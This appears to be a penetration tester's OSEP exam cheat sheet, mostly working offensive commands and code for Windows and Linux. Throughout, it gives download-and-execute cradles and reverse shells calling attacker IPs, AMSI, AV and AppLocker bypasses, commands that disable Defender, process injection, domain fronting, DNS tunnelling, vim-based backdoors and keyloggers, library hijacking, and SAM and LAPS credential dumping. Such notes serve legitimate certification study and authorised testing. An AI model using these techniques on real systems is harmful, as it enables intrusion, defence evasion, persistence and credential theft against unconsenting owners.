`https://steflan-security.com/offensive-security-experienced-penetration-tester-osep-review/`

# todo
- tidy up OSEP code snippets
- asciinema prep
- sectioned shellcode runner
- html smuggling
- invoke-portscan

# playbook
- upload payload with AV bypass (bypass AV)
- migrate to a different process (process injection via meterpreter)
- shell > powershell (Bypass-AMSI)
- alternatively build msbuild xml files you want to run on the system
- perform post exploit enumeration (WinPeas.ps1/Invoke-Seatbelt)
- perform active directory enumeration (powerview.ps1/SharpHound.ps1)
	- note down high value targets (domain admin)
- privesc (then privesc again to SYSTEM if you are local admin that wants AD access)
- disable defences
- after getting system shell migrate to spoolsv
- use incognito to switch to a user targeted by AD enumeration

# proxy
- the Meterpreter HTTP and HTTPS payloads are proxy-aware
- the Net.WebClient download cradle is by default proxy-aware
```
# viewing the proxy settings of Net.WebClient
[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://192.168.119.120/run.ps1")
...
Host           : 192.168.120.12
Port           : 3128
...

# removing the proxy settings by "nulling" them
$wc = new-object system.net.WebClient
$wc.proxy = $null
$wc.DownloadString("http://192.168.119.120/run.ps1")
```
- SYSTEM Net.WebClient download cradle may not be proxy-aware, therefore we manually enable proxy awareness for the SYSTEM user
```
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
$wc = new-object system.net.WebClient
# may need to rename file because powershell may cache previous download
$wc.DownloadString("http://192.168.119.120/run2.ps1")
```
## user-agent filter bypass
```
# spoof user-agent to bypass proxy filter
$wc = new-object system.net.WebClient
$wc.Headers.Add('User-Agent', "This is my agent, there is no one like it...")
$wc.DownloadString("http://192.168.119.120/run.ps1")
```
# shellcode runner
```
# powershell download cradle
cp simple_shellcode_runner/simple_shellcode_runner.ps1 run.txt
python3 -m http.server 80
---
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost 192.168.49.102; set lport 443; exploit"
---
powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.49.102/run.txt'))
```

# dotnettojscript

Example with process hollowing:
```
# copy relevant parts of shellcode_process_hollowing/Program.cs to DotNetToJScript/ExampleAssembly/TestClass.cs

# mono build then copy ExampleAssembly.dll
cd DotNetToJScript/DotNetToJScript/bin/Release
cp ../../../ExampleAssembly/bin/Release/ExampleAssembly.dll .

# on windows dev mount the smb in powershell
cd Z:\OSEP-Code-Snippets\DotNetToJScript\DotNetToJScript\bin\Release\
.\DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js

# prepend amsi bypass onto demo.js and transfer to victim
OSEP-Code-Snippets/bypass_amsi_jscript
```

## SuperSharpShooter

```
cd SuperSharpShooter
python3 -m venv env
. ./env/bin/activate
pip install jsmin colorama
---
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.102 LPORT=443 -e x64/xor_dynamic -b '\\x00\\x0a\\x0d' -f raw  > rawsc.bin
./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload js --output test
```

```
msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x64 --platform windows -e x64/xor_dynamic  -b '\x00\x0a\x0d' -f raw -o rawsc.bin
```

## html smuggling
Demo: https://www.youtube.com/watch?v=UucQaVoETSY
Otherwise: https://github.com/mdsecactivebreach/SharpShooter
https://portal.offsec.com/courses/pen-300/books-and-videos/modal/modules/client-side-code-execution-with-office/will-you-be-my-dropper/html-smuggling

# reflective loading dll

Create a malicious dll with namespace  `ClassLibrary1` and class name `Class1`. Inside `Class1` define your `runner` method.
```
# using simple_shellcode_runner but right-click project file > Options
# Build > General > Compile Target: Library

$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ClassLibrary1.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

## reflective loading exe
```

PS C:\Windows\Tasks> $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.189/simple_shellcode_runner.exe')
PS C:\Windows\Tasks> $assem = [System.Reflection.Assembly]::Load($data)
PS C:\Windows\Tasks> [rev.Program]::Main("".Split())

# alternative: without arguments
PS C:\Windows\Tasks> [rev.Program]::Main()
```


## msbuild
https://github.com/bohops/GhostBuild/blob/master/GhostBuilder.py
```
python3 GhostBuilder.py -e path/to/bad.exe -o bad.xml
# upload to victim
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\bad\bad.xml
```

# reflective injecting dll
`reflective_dll_injection/Invoke-ReflectivePEInjection.ps1`
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.102 LPORT=443 -e x64/xor_dynamic  -b '\\x00\\x0a\\x0d' -f dll -o met.dll
```

```
# start a http server to host malicious dll and start listener
$bytes = (New-Object System.Net.WebClient).DownloadData('http://<KALI_IP>/met.dll')
$procid = (Get-Process -Name explorer).Id
Import-Module <PATH>\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

# process injection
`shellcode_process_injector/bin/x64/Release/shellcode_process_injector.exe`
Use the commented section if you want to automatically inject a user that is currently logged in
```
        // TODO: use the commented out section if 'true' doesn't work
        static bool IsElevated = true;
        //static bool IsElevated
        //{
        //    get
        //    {
        //        return WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
        //    }
        //}
```

## process injection via meterpreter
```
meterpreter > ps
...
3388   752   WmiPrvSE.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
...
meterpreter > migrate 3388

# alternative create a new process and migrate to it
execute -H -f notepad
Process <PID> created.

migrate <PID>
```

# process hollowing
`OSEP-Code-Snippets/shellcode_process_hollowing/`
targets svchost.exe because it generally has network activity, guts out whats inside and replaces it shell code.

# bypass AV

## ROT
```
mono OSEP-Code-Snippets/ROT_shellcode_encoder/bin/Release/ROT_shellcode_encoder.exe 2
# better alternative
OSEP-Code-Snippets/general_encoders/rot_shellcode.py 0xeb,0x27,...
```

## Non-Emulated APIs
replace `VirtualAlloc`/`VirtualAllocEx` with `VirtualAllocExNuma` because some AVs don't support emulating that API.
```
# replace VirtualAlloc
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, 
    uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

# add GetCurrentProcess for hProcess argument
[DllImport("kernel32.dll")]
static extern IntPtr GetCurrentProcess();

# modify API call in code
IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
if(mem == null)
{
    return;
}
```

## VBA obfuscation shellcode
- Use 32bit shellcode for MS Word vba payloads
- Use 64bit shellcode for MS Word vba + ps payloads
```
# unobfuscated
msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.49.102 LPORT=443 EXITFUNC=thread -f vbapplication
# paste it into buf variable in simple_shellcode_runner/simple_shellcode_runner.vba
sudo msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_https; set lhost 192.168.45.168; set lport 443; exploit"

# [BETTER] obfuscated
msfvenom -p windows/meterpreter/reverse_https LHOST=<KALI_IP> LPORT=443 EXITFUNC=thread -f ps1
general_encoders/vba_encode.py <ps1_payload>
# paste it into buf variable in simple_shellcode_runner/simple_shellcode_runner.vba
sudo msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_https; set lhost 192.168.45.168; set lport 443; exploit"

# [BEST] obfuscated alternative for vba + ps
cp simple_shellcode_runner/simple_shellcode_runner.ps1 run.txt
python3 -m http.server 80
---
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost <KALI_IP>; set lport 443; exploit"
---
general_encoders/vba_ps_encode.py "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://<KALI_IP>/run.txt'))"
---
# paste it into buf variable in simple_shellcode_runner/vba_ps_shellcode_runner.vba
# stomp with EvilClippy and send to victim
cp macro_templates/lorem_ipsum_redux.doc ./lorem_ipsum_stomped.doc
mono EvilClippy/EvilClippy.exe -s vba.vba lorem_ipsum_stomped.doc
# doc filename must be 'lorem_ipsum_redux.doc' otherwise it won't execute payload
```

## Microsoft Word Stomping

Manual:
- Use FlexHEX: `Edit > Insert Zero Block`
- Zero `Module=MyMacro` in `PROJECT`
- View `_VBA_PROJECT` for microsoft version
- Zero `Attribut e VB_Nam e...` in MyMacro

Automated:
```
git clone https://github.com/outflanknl/EvilClippy.git
cd EvilClippy
mcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs
# legit.vba is used to hide actual macro
printf 'Sub sbHello()\nMsgBox "Hello World!"\nEnd Sub' > legit.vba
cp macro_templates/lorem_ipsum_redux.doc ./lorem_ipsum_stomped.doc
mono EvilClippy.exe -s legit.vba lorem_ipsum_stomped.doc
```

## Bypass-AMSI

```
https://amsi.fail/
use one of the options below and download straight into memory
IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.195/amsi.txt")

# option 1:
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# option 2:
[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)

# option 3:
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)

# options 4:
https://github.com/TheD1rkMtr/AMSI_patch
```

## FodHelper UAC Bypass
- encode second stage with x64/xor_dynamic to bypass Windows Defender
- x64/zutto_dekiru doesn't work with current version of metasploit
```
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.49.102; set lport 443; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; exploit"
---
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX" -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
C:\Windows\System32\fodhelper.exe
```

## jscript bypass amsi

```
# use sharpshooter to generate js shellcode runner
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.49.102 LPORT=443 -e x64/xor_dynamic  -b '\\x00\\x0a\\x0d' -f raw  > rawsc.bin

./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload js --output test --amsi amsienable

# start the listener; transfer to host and execute

# alternatively manual disable AmsiEnable register
# run SharpShooter without --amsi flag and prepend bypass amsi code
OSEP-Code-Snippets/bypass_amsi_jscript/register_bypass_amsi.js

# alternatively copy+rename wscript.exe to AMSI.dll bypass
# make sure C:\Windows\Tasks doesn't already hav AMSI.dll
OSEP-Code-Snippets/bypass_amsi_jscript/dll_bypass_amsi.js
```

## remove windows definitions
- scenario: you can run privileged commands (eg. printspoofer) but you don't have a privileged shell because your rev.exe gets flagged by AV
```
PrintSpoofer.exe \\.\pipe\test\pipe\spoolss "\"C:\Program Files\Windows Defender\MpCmdRun.exe\" -RemoveDefinitions -All"
# ctrl+z; in another shell
. .\Invoke-SpoolSample.ps1
Invoke-SpoolSample -Target '<hostname>' -CaptureServer '<hostname>/pipe/test'
Invoke-SpoolSample -Target 'web01' -CaptureServer 'web01/pipe/test'
# ctrl+z; back in shell running printspoofer
channel -l
channel -i <id>
Impersonated user is: NT AUTHORITY\SYSTEM.
Executed '"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All' with impersonated token!
```

## disable AV
see also: https://github.com/swagkarna/Defeat-Defender-V1.2.0
see also: https://github.com/jeremybeaume/tools/blob/master/disable-defender.ps1
see also: https://theitbros.com/managing-windows-defender-using-powershell/
```powershell
# you may need to disable tamper protection first
Set-MpPreference -DisableRealtimeMonitoring $true

# confirm that it works: output should be True
Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring

# disable_defender derived from luna grabber
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend; Set-MpPreference -SubmitSamplesConsent 2; Add-MpPreference -ExclusionPath %SystemRoot%\Tasks; Set-MpPreference -ExclusionExtension '.exe'
```

```
# if you need to disable tamper protection in order to disable AV you need to be SYSTEM or NT Service\TrustedInstaller
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtection -Value 4
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtectionSource -Value 2
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name SenseDevMode -Value 0

# confirm tamper protection state
Get-MpComputerStatus | select IsTamperProtected
```

# applocker bypass
disable if you have admin: gpedit.msc > make changes > exit > cmd > `gpupdate /force`
## alternate data stream
```
# example: we have a JScript shellcode runner we want to bypass

# creations
type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
# exploitation
wscript.exe "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
```
## powershell runspace via installutil
use this if you come across this error in powershell:
`Cannot invoke method. Method invocation is supported only on core types in this language mode.`
- copy `System.Management.Automation.dll` to csharp project folder and edit `applocker_bypass_powershell_runspace.csproj`
```
# dependency location
C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll

vim applocker_bypass_powershell_runspace.csproj
...
<Reference Include="System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=MSIL">
      <SpecificVersion>False</SpecificVersion>
      <HintPath>.\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll</HintPath>
```
- in the program you need to chain your powershell commands
```
# example: you want to run privesc enum script
            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.168/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Windows\\Tasks\\test.txt";

```
- file.txt `(applocker_bypass_powershell_runspace.exe)` downloads run.txt `(simple_shellcode_runner/simple_shellcode_runner.ps1)`
```
# encode payload
echo "-----BEGIN CERTIFICATE-----" > file.txt; cat applocker_bypass_powershell_runspace.exe | base64 >> file.txt; echo "-----END CERTIFICATE-----" >> file.txt; python3 -m http.server 80
# start a listener
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost <KALI_IP>; set lport 443; exploit"
# download, decode and execute; use '&&' instead of ';' for cmd
certutil -urlcache -split -f "http://192.168.45.168/file.txt"; certutil -decode file.txt bypass.exe; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe
```
## bypass for reflective injecting dll
resource needed: `reflective_dll_injection/Invoke-ReflectivePEInjection.ps1`
`applocker_bypass_powershell_runspace\Program.cs`
```
String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
```
perform same exploit as `powershell runspace via installutil`

## Microsoft.Workflow.Compiler.exe
```
# modify applocker_bypass_workflow_compiler.ps1 on the win dev box

...
$output = "<PATH>\run.xml"
...
$Acl = Get-ACL $output;$AccessRule= New-Object
System.Security.AccessControl.FileSystemAccessRule("<USER>","FullControl","none","none","Allow");$Acl.AddAccessRule($AccessRule);Set-Acl $output $Acl
...
```

> ENSURE: the executable you want to load into memory (e.g. SharpUp.exe) is in the same folder as file1.txt and file2.txt

```
# encode payloads applocker_bypass_workflow_compiler.ps1  test.txt
# test.txt is your csharp payload
echo "-----BEGIN CERTIFICATE-----" > file1.txt; cat applocker_bypass_workflow_compiler.ps1 | base64 >> file1.txt; echo "-----END CERTIFICATE-----" >> file1.txt; echo "-----BEGIN CERTIFICATE-----" > file2.txt; cat test.txt | base64 >> file2.txt; echo "-----END CERTIFICATE-----" >> file2.txt; python3 -m http.server 80
```

```
# download, decode and execute; use ';' instead of '&&' for powershell
cd \Windows\Tasks
certutil -urlcache -split -f "http://192.168.49.102/file1.txt" && certutil -decode file1.txt applocker_bypass_workflow_compiler.ps1 && certutil -urlcache -split -f "http://192.168.49.102/file2.txt" && certutil -decode file2.txt test.txt 
```

```
powershell -ep bypass .\applocker_bypass_workflow_compiler.ps1
C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
```

### troubleshooting
```
- make sure the method you are invoking is public
- if there are arguments eg 'audit' for the Main method you are calling:
Invoke(0, new object[] { new string[] { "audit" } });
```

## mshta.exe
```
# use OSEP-Code-Snippets/applocker_bypass_jscript/test.hta
# use sharpshooter to replace placeholder Jscript with shellcode Jscript
C:\Windows\System32\mshta.exe \path\to\test.hta

# alternatively create a shortcut
C:\Windows\System32\mshta.exe http://192.168.49.102\test.hta
```

## XSL
```
# use OSEP-Code-Snippets/applocker_bypass_jscript/test.xsl
# note payload runs in a background context
wmic os get /format:"http://<IP>/test.xsl"
```

## Regsvr32.exe
```
# reference: https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll

# host file.sct via metasploit
use auxiliary/server/regsvr32_command_delivery_server
```

## disable applocker
- via GUI
```
gpedit.msc > Computer Configuration > Windows Settings > Security Settings > Application Control Policies > AppLocker
```
- via CMD: create a file disable_applocker.inf
```
[Version]
Signature="$WINDOWS NT$"

[Unicode]
Unicode=yes

[RegistryValues]
; Delete AppLocker GPO settings
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2 /f
```

```
secedit /configure /db %windir%\security\local.sdb /cfg path\to\disable_applocker.inf /areas SECURITYPOLICY
```
- via PowerShell
```
# open powershell as administrator
Get-AppLockerPolicy -Effective | Set-AppLockerPolicy -RuleType None
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process
```

# bypass network filters

## generate self-signed certs
```
openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
cat priv.key cert.crt > nasa.pem

sudo vim /etc/ssl/openssl.cnf
...
CipherString=DEFAULT

msf6 exploit(multi/handler) > set HandlerSSLCert /path/to/nasa.pem

# automated, impersonate google.com certificate
use auxiliary/gather/impersonate_ssl
set rhosts www.google.com
exploit
use multi/handler
set HandlerSSLCert /root/.msf4/loot/<stolen>.pem
```

## domain fronting

```
# generate payload with HttpHostHeader and LHOST pointing to beachhead
msfvenom -p windows/x64/meterpreter_reverse_https HttpHostHeader=cdn123.offseccdn.com LHOST=good.com LPORT=443 -f exe > https-df.exe
```

```
sudo vi /etc/hosts
...
172.16.102.21 bad.com # swap it with our attacker ip
...
```

```
sudo systemctl restart dnsmasq
sudo systemctl restart nginx

sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter_reverse_https; set LHOST good.com; set lport 443; set HttpHostHeader cdn123.offseccdn.com; exploit"
```

## dns tunnelling

```
sudo vi /etc/dnsmasq.conf

server=/tunnel.com/192.168.49.102
server=/somedomain.com/192.168.49.102

sudo systemctl restart dnsmasq

# start listener on kali
dnscat2-server tunnel.com

# on windows victim
dnscat2-v0.07-client-win32.exe tunnel.com

# back on kali press enter the type
dnscat2> session -i 1
command (client) 1> shell
command (client) 1> session -i 2
cmd.exe (client) 2> whoami
client\offsec

# ctrl+z to leave session
command (client) 1> listen 127.0.0.1:3389 <victim_ip>:3389

# you can now access victim machine via localhost
xfreerdp /u:Offsec /v:127.0.0.1 /p:lab
```


# linux post exploitation

## vim (privileged) backdoor
edit `.bashrc` and append:
```
alias sudo="sudo -E"
```
update bash environment
```
source ~/.bashrc
```
create a vim run script
```
vim ~/.vimrunscript
...
# payload, reverse shell example
bash -i >& /dev/tcp/192.168.49.102/443 0>&1
```
edit/create '.vimrc' and append
```
:silent !source ~/.vimrunscript
```
every time the victim user runs vim it will execute our backdoor payload
## vim privesc
if user can run sudo vim, once you are inside vim run `:shell`
## vim keylogger
append to `/home/offsec/.vim/plugin/settings.vim`
```
mkdir -p ~/.vim/plugin/
vim ~/.vim/plugin/settings.vim
...
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
```
## linux shellcode loader with AV bypass
`OSEP-Code-Snippets/linux_shellcode_loaders/simpleLoader.c` with `simpleXORencoder.c`
```
sudo msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.246; set lport 443; exploit"

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.45.167 LPORT=443 -f c
- replace shell code in simpleXORencoder.c
gcc simpleXORencoder.c -o simpleXORencoder && ./simpleXORencoder

- replace shell code in simpleLoader.c with output of simpleXORencoder; (on victim):
gcc -o simpleLoader simpleLoader.c -z execstack
```
## LD_LIBRARY_PATH

```
./shellcodeCrypter-msfvenom.py 192.168.45.5 443 cpp xor 250 linux/x64/shell_reverse_tcp

# Compile as follows
gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_LIBRARY_PATH.o sharedLibrary_LD_LIBRARY_PATH.c
gcc -shared -o sharedLibrary_LD_LIBRARY_PATH.so sharedLibrary_LD_LIBRARY_PATH.o -ldl

# update environment variables
export LD_LIBRARY_PATH=/home/offsec/

# highjack target: 'top'; lets see what libraries it depends on
ldd /usr/bin/top
...
libgpg-error.so.0 => /lib/x86_64-linux-gnu/libgpg-error.so.0 (0x00007fa3b8887000)

# rename our malicious library to name of our target library
cp sharedLibrary_LD_LIBRARY_PATH.so libgpg-error.so.0

# trigger error by running top to determine what symbols we need
$ top
top: /home/offsec/libgpg-error.so.0: no version information available (required by /lib/x86_64-linux-gnu/libgcrypt.so.20)
top: relocation error: /lib/x86_64-linux-gnu/libgcrypt.so.20: symbol gpgrt_lock_lock version GPG_ERROR_1.0 not defined in file libgpg-error.so.0 with link time reference

readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'

# copy the output back into sharedLibrary_LD_LIBRARY_PATH.so and recompile
...
static void runmahpayload() __attribute__((constructor));

int gpgrt_onclose;
// [...output from readelf here...]
int gpgrt_poll;
...
```

```
# optional fix "no version information available"
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'

vim gpg.map
...

GPG_ERROR_1.0 {
gpgrt_onclose;
_gpgrt_putc_overflow;
...
gpgrt_fflush;
gpgrt_poll;

};

# recompile with --version-script gpg.map
gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_LIBRARY_PATH.o sharedLibrary_LD_LIBRARY_PATH.c
gcc -shared -Wl,--version-script gpg.map -o sharedLibrary_LD_LIBRARY_PATH.so sharedLibrary_LD_LIBRARY_PATH.o -ldl
export LD_LIBRARY_PATH=/home/offsec/
cp sharedLibrary_LD_LIBRARY_PATH.so libgpg-error.so.0
top
```

## LD_PRELOAD

```
gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_PRELOAD.o sharedLibrary_LD_PRELOAD.c
gcc -shared -o sharedLibrary_LD_PRELOAD.so sharedLibrary_LD_PRELOAD.o -ldl
export LD_PRELOAD=/home/offsec/sharedLibrary_LD_PRELOAD.so
cp /etc/passwd /tmp/testpasswd
```


```
# with sudo alias
unset LD_PRELOAD
vim .bashrc
...
alias sudo="sudo LD_PRELOAD=/home/offsec/sharedLibrary_LD_PRELOAD.so"

source .bashrc
sudo cp /etc/passwd /tmp/testpasswd
```

# windows credentials

## dumping SAM

```
# run as admin
wmic shadowcopy call create Volume='C:\'

# get shadow copy path
vssadmin list shadows
...
Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
...

# copy sam and system from shadow copy path
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system
```

```
# alternatively reg save copy
reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
```

## cracking sam

```
# use creddump7 or mimikatz or samdump2
samdump2 [OPTION]... SYSTEM_FILE SAM_FILE
```

## LAPS

```
https://github.com/leoloobeek/LAPSToolkit

# see which machines are LAPS enabled and attempt to view password
Import-Module .\LAPSToolkit.ps1

# attempt to get local admin creds
Get-LAPSComputers

# if password is blank
Find-LAPSDelegatedGroups

# use the Delegated Group Name to find members who read LAPS password in plaintext
Get-NetGroupMember -GroupName "LAPS Password Readers"

# run powershell as different user who can read LAPS password (WinKey + R)
runas /user:corp1.com\jeff powershell

# import and get local admin creds this time
Import-Module .\LAPSToolkit.ps1
Get-LAPSComputers
```

## access tokens (printspoofer)
executing as service account (or an account that hasn't logged in interactively)
```
# start 2 multi/handler, one with exploit -j because you will be catching two shells (low priv and sys priv)
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.45.197; set lport 443; exploit -j"
meterpreter > upload OSEP-Code-Snippets/PrintSpoofer.NET/bin/x64/Release/PrintSpoofer.exe c:\\windows\\tasks
meterpreter > upload OSEP-Code-Snippets/active_directory/Invoke-SpoolSample.ps1 c:\\windows\\tasks
meterpreter > upload OSEP-Code-Snippets/simple_shellcode_runner/bin/x64/Release/simple_shellcode_runner.exe c:\\windows\\tasks\\test.exe
.\PrintSpoofer.exe \\.\pipe\test\pipe\spoolss <command to run>
.\PrintSpoofer.exe \\.\pipe\test\pipe\spoolss c:\windows\tasks\test.exe
# ctrl+z; in another shell
shell
Invoke-SpoolSample -Target '<hostname>' -CaptureServer '<hostname>/pipe/test'
Invoke-SpoolSample -Target 'web01' -CaptureServer 'web01/pipe/test'
# ctrl+z; back in shell running printspoofer
channel -l
channel -i <id>
Impersonated user is: NT AUTHORITY\SYSTEM.
Executed 'c:\windows\tasks\test.exe' with impersonated token!
# ctrl+z, and background the meterpreter session, we should have caught a system reverse shell
background
sessions -l
sessions -i <id>
```

printspoofer in memory
```
# use updated spoolsample repo: https://github.com/NukingDragons/PrintSpooferNet
https://github.com/NukingDragons/PrintSpooferNet/releases/download/v1.0/PrintSpooferNet.exe

# generate powershell base64 'reflective loading dll' (earlier section) as a one liner
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('$data = (New-Object System.Net.WebClient).DownloadData("http://ip/runner.dll");$assem = [System.Reflection.Assembly]::Load($data);$class = $assem.GetType("rev.Program");$method = $class.GetMethod("Main");$method.Invoke(0, $null)'))
